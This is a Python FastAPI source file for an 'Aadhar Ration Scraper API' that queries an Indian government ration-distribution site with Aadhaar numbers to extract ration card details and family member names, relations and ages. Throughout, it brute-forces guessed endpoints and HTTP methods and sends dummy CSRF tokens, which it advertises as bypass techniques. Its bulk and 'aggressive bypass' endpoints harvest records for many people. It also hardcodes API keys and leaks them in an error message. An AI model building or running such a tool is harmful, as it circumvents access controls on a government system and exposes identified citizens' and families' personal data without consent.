# aadhr-imdi/api/index.py
# Developer: Abhay Singh
# Updated with multiple bypass techniques for direct requests

from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from typing import Dict, Any, Optional
import requests
from bs4 import BeautifulSoup
import re
import time
import urllib.parse

app = FastAPI(title="Aadhar Ration Scraper API", owner="Abhay Singh", version="4.0")

# ========== API KEYS ==========
VALID_API_KEYS = [
    "XERO-DEEPSEEK-KEY-001",
    "ABHAY-SINGH-MASTER-002", 
    "RATION-SCRAPER-003",
    "OSINT-PRO-004",
    "DEV-STRESS-TEST-005"
]
MASTER_API_KEY = "ABHAY-SINGH-ADMIN-MASTER"
DEMO_KEY = "demo"

def verify_api_key(key: Optional[str] = None) -> bool:
    if key is None:
        return False
    return key in VALID_API_KEYS or key == MASTER_API_KEY or key == DEMO_KEY

# ========== ADVANCED SESSION WITH BYPASS TECHNIQUES ==========
class BypassSession:
    """Session handler with multiple bypass techniques"""
    
    def __init__(self):
        self.session = requests.Session()
        self.update_headers()
    
    def update_headers(self, additional_headers=None):
        """Set headers to mimic real browser"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0"
        }
        if additional_headers:
            headers.update(additional_headers)
        self.session.headers.update(headers)
    
    def try_multiple_methods(self, url: str, params: dict, data: dict) -> tuple:
        """
        Try multiple HTTP methods to bypass restrictions
        Returns (response, method_used)
        """
        methods_to_try = []
        
        # Method 1: Normal POST with data
        methods_to_try.append(("POST (normal)", lambda: self.session.post(url, data=data, timeout=15)))
        
        # Method 2: POST with params in URL
        methods_to_try.append(("POST (params in URL)", lambda: self.session.post(url, params=params, data=data, timeout=15)))
        
        # Method 3: GET with params
        methods_to_try.append(("GET (params)", lambda: self.session.get(url, params={**params, **data}, timeout=15)))
        
        # Method 4: POST with different content-type
        methods_to_try.append(("POST (JSON)", lambda: self.session.post(url, json={**params, **data}, timeout=15)))
        
        # Method 5: GET with everything in URL
        combined = {**params, **data}
        methods_to_try.append(("GET (combined)", lambda: self.session.get(f"{url}?{urllib.parse.urlencode(combined)}", timeout=15)))
        
        for method_name, method_call in methods_to_try:
            try:
                response = method_call()
                if response.status_code == 200:
                    return response, method_name
            except:
                continue
        
        return None, None

# ========== IMPROVED SCRAPING FUNCTION ==========
def scrape_ration_by_aadhar(aadhar_number: str) -> Dict[str, Any]:
    """
    Enhanced scraping with multiple bypass techniques
    """
    aadhar_clean = re.sub(r'\D', '', aadhar_number)
    if len(aadhar_clean) != 12:
        return {"error": f"Invalid Aadhar: must be 12 digits", "aadhar": aadhar_number}
    
    base_url = "https://impds.nic.in/impdsdeduplication"
    
    # Multiple endpoint patterns to try
    endpoint_variants = [
        f"{base_url}/searchRationByAadhar",
        f"{base_url}/getRationDetails",
        f"{base_url}/aadharSearch",
        f"{base_url}/search",
        f"{base_url}/api/search",
        f"{base_url}/ration/search",
        f"{base_url}/public/search",
        f"{base_url}/aadhar/{aadhar_clean}",
        f"{base_url}/ration/aadhar/{aadhar_clean}",
        f"{base_url}/api/v1/search?aadhar={aadhar_clean}",
        f"{base_url}/getDetails",
        f"{base_url}/fetchData",
    ]
    
    # Parameter patterns to try
    param_variants = [
        {"aadharNumber": aadhar_clean},
        {"aadhar": aadhar_clean},
        {"aadhar_card": aadhar_clean},
        {"uid": aadhar_clean},
        {"aadhaar": aadhar_clean},
        {"adhar": aadhar_clean},
        {"aadhar_no": aadhar_clean},
        {"number": aadhar_clean},
        {"id": aadhar_clean},
        {"search": aadhar_clean},
        {"query": aadhar_clean},
        {"value": aadhar_clean},
    ]
    
    # CSRF token patterns to try (including bypass attempts)
    csrf_values = [
        None,  # No token
        "",    # Empty token
        "test", # Dummy token
        "dummy", # Another dummy
        "abc123", # Random
    ]
    
    # Try all combinations
    for endpoint in endpoint_variants:
        for params in param_variants:
            for csrf_val in csrf_values:
                try:
                    # Create session for this attempt
                    bs = BypassSession()
                    
                    # Prepare data with CSRF
                    data = dict(params)
                    if csrf_val is not None:
                        for csrf_name in ['csrf_token', '_token', 'csrfmiddlewaretoken', 'authenticity_token', 'csrf']:
                            data[csrf_name] = csrf_val
                    
                    # Try multiple HTTP methods
                    response, method_used = bs.try_multiple_methods(endpoint, {}, data)
                    
                    if response and response.status_code == 200:
                        # Check if response contains valid data
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        # Look for ration card data patterns
                        if is_valid_response(response.text, aadhar_clean):
                            return parse_response(response.text, aadhar_clean, endpoint, method_used)
                            
                except Exception as e:
                    continue
    
    return {
        "error": "No data found after trying all endpoints and methods",
        "aadhar": aadhar_clean,
        "tried_endpoints": len(endpoint_variants),
        "tried_param_patterns": len(param_variants),
        "message": "impds.nic.in may be down or Aadhar not registered"
    }

def is_valid_response(html: str, aadhar: str) -> bool:
    """Check if response contains actual data (not error page)"""
    negative_patterns = [
        'not found', 'invalid', 'no record', 'error 404', 'access denied',
        'login required', 'session expired', 'unauthorized', 'forbidden'
    ]
    
    html_lower = html.lower()
    
    # If any negative pattern and no positive indicators
    for pattern in negative_patterns:
        if pattern in html_lower:
            return False
    
    # Positive indicators
    positive_patterns = [
        'ration', 'card', 'family', 'member', 'aadhar', aadhar,
        'table', 'td', 'name', 'father', 'mother'
    ]
    
    for pattern in positive_patterns:
        if pattern in html_lower:
            return True
    
    return False

def parse_response(html: str, aadhar: str, endpoint: str, method: str) -> Dict[str, Any]:
    """Parse HTML response to extract ration card data"""
    soup = BeautifulSoup(html, 'html.parser')
    
    result = {
        "aadhar": aadhar,
        "ration_card_number": None,
        "card_type": None,
        "family_members": [],
        "status": None,
        "source_endpoint": endpoint,
        "method_used": method,
        "scraped_at": time.time(),
        "developer": "Abhay Singh"
    }
    
    # Extract ration card number - multiple patterns
    patterns = [
        r'ration[_\s]?card[_\s]?[a-z]*[:\s]*([A-Z0-9/]+)',
        r'card[_\s]?no[:\s]*([A-Z0-9/]+)',
        r'ration[_\s]?id[:\s]*([A-Z0-9/]+)',
        r'card[_\s]?number[:\s]*([A-Z0-9/]+)'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html, re.I)
        if match:
            result["ration_card_number"] = match.group(1)
            break
    
    # If not found via regex, try HTML selectors
    if not result["ration_card_number"]:
        selectors = [
            '.ration-card-number', '.card-number', '#rationCardNo',
            '.rationNo', '.card_no', 'span.ration-number',
            'td:contains("Card No") + td', 'td:contains("Ration Card") + td'
        ]
        for selector in selectors:
            elem = soup.select_one(selector)
            if elem and elem.text.strip():
                result["ration_card_number"] = elem.text.strip()
                break
    
    # Extract family members
    tables = soup.find_all('table')
    for table in tables:
        rows = table.find_all('tr')
        for row in rows[1:15]:
            cols = row.find_all('td')
            if len(cols) >= 2:
                member = {}
                for i, col in enumerate(cols):
                    text = col.text.strip()
                    if i == 0 or 'name' in str(col).lower():
                        member['name'] = text
                    elif i == 1 or 'relation' in str(col).lower():
                        member['relation'] = text
                    elif i == 2 or 'age' in str(col).lower():
                        member['age'] = text
                if member.get('name') or member.get('relation'):
                    result["family_members"].append(member)
        
        if result["family_members"]:
            break
    
    # Extract status
    status_keywords = ['active', 'inactive', 'suspended', 'valid', 'expired']
    for keyword in status_keywords:
        if keyword in html.lower():
            result["status"] = keyword.title()
            break
    
    return result

# ========== API ENDPOINTS ==========

@app.get("/")
def root():
    return {
        "name": "Aadhar Ration Scraper API",
        "developer": "Abhay Singh",
        "version": "4.0",
        "features": [
            "Multi-endpoint scanning",
            "Multi-parameter testing", 
            "CSRF bypass attempts",
            "Multiple HTTP methods",
            "Automatic response validation"
        ],
        "authentication": {
            "method": "Query Parameter",
            "parameter": "key",
            "example": "?aadhar=123456789012&key=demo",
            "demo_key": "demo"
        },
        "endpoints": [
            {"path": "/", "method": "GET", "description": "API info"},
            {"path": "/scrape/ration?aadhar=123456789012&key=demo", "method": "GET", "description": "Search single Aadhar"},
            {"path": "/scrape/bulk?aadhars=123456789012,234567890123&key=demo", "method": "GET", "description": "Bulk search"},
            {"path": "/scrape/bypass?aadhar=123456789012&key=demo", "method": "GET", "description": "Aggressive bypass search"},
            {"path": "/keys/list?key=MASTER_KEY", "method": "GET", "description": "List keys"},
            {"path": "/health", "method": "GET", "description": "Health check"}
        ]
    }

@app.get("/scrape/ration")
async def scrape_ration_endpoint(
    aadhar: str = Query(..., description="12-digit Aadhar number"),
    key: str = Query(..., description="API Key (use 'demo' for testing)"),
    format: str = Query("json", description="json or text")
):
    """Scrape ration card using Aadhar number"""
    
    if not verify_api_key(key):
        return JSONResponse(
            status_code=401,
            content={"error": "Invalid API Key", "valid_keys": VALID_API_KEYS, "demo_key": DEMO_KEY}
        )
    
    aadhar_clean = re.sub(r'\D', '', str(aadhar))
    if len(aadhar_clean) != 12:
        return JSONResponse(
            status_code=400,
            content={"error": "Invalid Aadhar", "received": aadhar, "message": "Must be 12 digits"}
        )
    
    try:
        result = scrape_ration_by_aadhar(aadhar_clean)
        
        if format == "text":
            text_out = f"""
╔══════════════════════════════════════════════════════════════╗
║              RATION CARD SEARCH RESULT (BYPASS MODE)        ║
║                    Developer: Abhay Singh                   ║
╚══════════════════════════════════════════════════════════════╝

AADHAR: {result.get('aadhar', 'N/A')}
RATION CARD: {result.get('ration_card_number', 'Not Found')}
CARD TYPE: {result.get('card_type', 'Not Found')}
STATUS: {result.get('status', 'Unknown')}

METHOD USED: {result.get('method_used', 'N/A')}
ENDPOINT: {result.get('source_endpoint', 'N/A')}

FAMILY MEMBERS ({len(result.get('family_members', []))}):
"""
            for m in result.get('family_members', []):
                text_out += f"  • {m.get('name', '')} - {m.get('relation', '')}\n"
            
            return JSONResponse(content={"output": text_out})
        
        return JSONResponse(content=result)
        
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e), "aadhar": aadhar_clean})

@app.get("/scrape/bypass")
async def aggressive_bypass(
    aadhar: str = Query(..., description="12-digit Aadhar number"),
    key: str = Query(..., description="API Key")
):
    """
    Aggressive bypass endpoint - tries EVERY possible combination
    More thorough but slower
    """
    
    if not verify_api_key(key):
        return JSONResponse(status_code=401, content={"error": "Invalid API Key"})
    
    aadhar_clean = re.sub(r'\D', '', str(aadhar))
    if len(aadhar_clean) != 12:
        return JSONResponse(status_code=400, content={"error": "Invalid Aadhar"})
    
    # Comprehensive testing
    all_attempts = []
    
    base_urls = [
        "https://impds.nic.in/impdsdeduplication",
        "https://impds.nic.in",
        "http://impds.nic.in:8080/impdsdeduplication",
    ]
    
    endpoints = [
        "/searchRationByAadhar", "/getRationDetails", "/aadharSearch",
        "/search", "/api/search", "/public/search", "/rest/search",
        "/ration", "/aadhar", "/fetch", "/getData", "/query",
        "/search/aadhar", "/api/v1/search", "/service/search"
    ]
    
    methods = ["POST", "GET", "PUT", "DELETE"]
    
    for base in base_urls:
        for endpoint in endpoints:
            for method in methods:
                for use_csrf in [True, False]:
                    try:
                        url = f"{base}{endpoint}"
                        session = requests.Session()
                        
                        if method == "GET":
                            resp = session.get(f"{url}?aadhar={aadhar_clean}&aadharNumber={aadhar_clean}", timeout=10)
                        else:
                            data = {"aadhar": aadhar_clean, "aadharNumber": aadhar_clean}
                            if use_csrf:
                                data["csrf_token"] = "test"
                            resp = session.post(url, data=data, timeout=10)
                        
                        all_attempts.append({
                            "url": url,
                            "method": method,
                            "status": resp.status_code,
                            "has_data": is_valid_response(resp.text, aadhar_clean)
                        })
                        
                        if resp.status_code == 200 and is_valid_response(resp.text, aadhar_clean):
                            return parse_response(resp.text, aadhar_clean, url, method)
                            
                    except:
                        continue
    
    return {
        "aadhar": aadhar_clean,
        "error": "No working endpoint found",
        "attempts": len(all_attempts),
        "sample_attempts": all_attempts[:10]
    }

@app.get("/scrape/bulk")
def scrape_bulk(
    aadhars: str = Query(..., description="Comma-separated Aadhar numbers"),
    key: str = Query(..., description="API Key"),
    delay: float = Query(2.0, description="Delay between requests")
):
    """Bulk scrape multiple Aadhar numbers"""
    
    if not verify_api_key(key):
        return JSONResponse(status_code=401, content={"error": "Invalid API Key"})
    
    aadhar_list = [re.sub(r'\D', '', a.strip()) for a in aadhars.split(",") if len(re.sub(r'\D', '', a.strip())) == 12]
    
    if not aadhar_list:
        return JSONResponse(status_code=400, content={"error": "No valid Aadhar numbers"})
    
    results = []
    for idx, aadhar in enumerate(aadhar_list):
        try:
            data = scrape_ration_by_aadhar(aadhar)
            results.append(data)
        except Exception as e:
            results.append({"aadhar": aadhar, "error": str(e)})
        if idx < len(aadhar_list) - 1:
            time.sleep(delay)
    
    return {
        "developer": "Abhay Singh",
        "total": len(results),
        "results": results
    }

@app.get("/keys/list")
def list_keys(key: str = Query(..., description="Master API Key")):
    if key != MASTER_API_KEY:
        return JSONResponse(status_code=403, content={"error": "Admin access required"})
    return {"keys": VALID_API_KEYS, "demo_key": DEMO_KEY, "master_key": MASTER_API_KEY}

@app.get("/health")
def health():
    return {"status": "active", "developer": "Abhay Singh", "version": "4.0", "timestamp": time.time()}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
